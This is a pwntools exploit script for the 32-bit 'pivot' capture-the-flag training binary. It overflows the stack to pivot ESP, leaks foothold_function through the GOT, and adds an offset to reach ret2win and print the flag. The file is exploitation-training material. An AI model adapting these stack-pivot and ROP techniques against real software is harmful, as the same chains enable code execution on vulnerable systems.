from pwn import *

BINARY = "./pivot32"
LIBRARY = "./libpivot32.so"
LIB = ELF(LIBRARY)
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "i386"
context.binary = BINARY
p = process(BINARY)

pop_eax         = p32(0x0804882C) # pop eax ; ret
call_eax        = p32(0x080485f0) # call eax ; ret
pop_ebx         = p32(0x080484a9) # pop ebx ; ret
xchg_eax_esp    = p32(0x0804882E) # xchg eax, esp  ; ret
mov_eax_ptr_eax = p32(0x08048830) # mov eax, [eax] ; ret
add_eax_ebx     = p32(0x08048833) # add eax, ebx ; ret

foothold_plt    = ELF.symbols.plt['foothold_function']
foothold_got    = ELF.symbols.got['foothold_function']
log.success(f"foothold_function in PLT : {hex(foothold_plt)}")
log.success(f"foothold_function in GOT : {hex(foothold_got)}")

offset_foothold_ret2win = LIB.symbols['ret2win'] - LIB.symbols['foothold_function']
log.success(f"OFFSET FROM foothold_function TO ret2win : {hex(offset_foothold_ret2win)}")

pivot_adr = p.recvuntil(b"Send a ROP chain now and it will land there\n> ").split(b'\n')[4].split(b' ')[-1]
pivot_adr = int(pivot_adr, 16)
log.success(f"PIVOT ADDRESS = {hex(pivot_adr)}")

# STEP 1 - Pivot to the first input (where our ROPchain will me stocked)
# --> set ESP to the ROPchain's address
pivot = b"A" * 44
pivot += pop_eax
pivot += p32(pivot_adr)
pivot += xchg_eax_esp

# SETP 2 - ret2win
# Calling foothold_function from to populate the GOT
rop = p32(foothold_plt)

# Resolving address of foothold_function in the library by deferencing the GOT pointer
rop += pop_eax
rop += p32(foothold_got)
rop += mov_eax_ptr_eax

# Calling ret2win by adding the offset to the foothold_function address
rop += pop_ebx
rop += p32(offset_foothold_ret2win)
rop += add_eax_ebx
rop += call_eax

#pause() # pause the execution to observe what's going on via a debugger : gdb -p <pid>
p.sendline(rop)
p.recvuntil(b"Now please send your stack smash\n> ")
p.sendline(pivot)

log.success(f"PIVOT chain = {pivot}")
log.success(f"ROPchain = {rop}")

flag = p.recv().split(b'\n')[-3]
log.success(f"FLAG : {flag}")
